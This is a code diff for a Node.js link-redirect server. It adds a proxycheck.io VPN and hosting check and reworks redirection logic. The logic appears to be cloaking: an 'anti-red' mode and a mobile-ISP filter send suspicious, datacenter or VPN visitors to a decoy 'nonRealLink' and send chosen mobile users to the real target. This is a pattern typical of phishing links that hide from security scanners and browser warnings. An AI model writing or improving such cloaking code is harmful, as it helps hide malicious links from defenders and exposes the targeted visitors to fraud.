@@ -23,6 +23,7 @@ const port = process.env.PORT || 3000;
 // ---------------------------------------------------------------------------
 const SESSION_SECRET = process.env.SESSION_SECRET || '';
 const ADMIN_TOKEN = (process.env.ADMIN_TOKEN || '').trim();
+const PROXYCHECK_API_KEY = (process.env.PROXYCHECK_API_KEY || '').trim();
 const NODE_ENV = process.env.NODE_ENV || 'development';
 const IS_PROD = NODE_ENV === 'production';
 
@@ -1734,21 +1735,54 @@ async function lookupIpGeo(ip) {
         return cached.data;
     }
     try {
+        if (PROXYCHECK_API_KEY) {
+            const response = await axios.get(
+                `https://proxycheck.io/v2/${encodeURIComponent(ip)}?key=${PROXYCHECK_API_KEY}&vpn=1&asn=1`,
+                { timeout: 5000 }
+            );
+            const res = response.data;
+            if (res.status === 'ok' || res.status === 'warning') {
+                const node = res[ip];
+                const data = {
+                    status: 'success',
+                    country: node.country || 'Unknown',
+                    countryCode: node.isocode || 'UN',
+                    regionName: node.region || 'Unknown',
+                    city: node.city || 'Unknown',
+                    isp: node.asn || node.provider || 'Unknown',
+                    org: node.provider || 'Unknown',
+                    proxy: node.proxy === 'yes',
+                    hosting: node.type === 'hosting',
+                    continentCode: node.continentcode || 'UN',
+                    query: ip
+                };
+                ipGeoCache.set(ip, { data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
+                return data;
+            }
+        }
+
         const response = await axios.get(
-            `https://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,regionName,city,isp,org,as,proxy,hosting,query,continentCode`,
+            `https://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,countryCode,regionName,city,isp,org,as,proxy,hosting,query,continentCode`,
             { timeout: 5000 }
         );
-        ipGeoCache.set(ip, { data: response.data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
+        const data = response.data;
+        if (data && data.status === 'success') {
+            ipGeoCache.set(ip, { data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
+        } else {
+            // Cache negative result briefly
+            ipGeoCache.set(ip, { data: null, expiresAt: now + 60 * 1000 });
+        }
     } catch {
-        // Cache negative result for 60 s so a flaky upstream doesn't burn CPU.
+        // Cache negative result briefly
         ipGeoCache.set(ip, { data: null, expiresAt: now + 60 * 1000 });
-        return null;
     }
+
     while (ipGeoCache.size > IP_GEO_CACHE_MAX) {
         const oldest = ipGeoCache.keys().next().value;
         ipGeoCache.delete(oldest);
     }
-    return ipGeoCache.get(ip).data;
+    const final = ipGeoCache.get(ip);
+    return final ? final.data : null;
 }
 
 // Per-user mutation queue — two concurrent /l/:slug hits on the same
@@ -1880,11 +1914,11 @@ async function handleRedirection(user, req, res, linkData) {
     // 4. Filtering Logic
     let targetUrl = realLink;
 
-    if (useAntiRed && (isSuspicious || !data || data.status !== 'success')) {
+    if (useAntiRed && isSuspicious) {
         targetUrl = nonRealLink;
     } else if (useIspFilter && data && data.status === 'success') {
         const userISP = (data.isp || data.org || "").toUpperCase();
-        const matches = useMobileIsps.some(isp => userISP.includes(isp.toUpperCase()));
+        const matches = (useMobileIsps || []).some(isp => isp && userISP.includes(isp.toUpperCase()));
         if (!matches) {
             targetUrl = nonRealLink;
         }
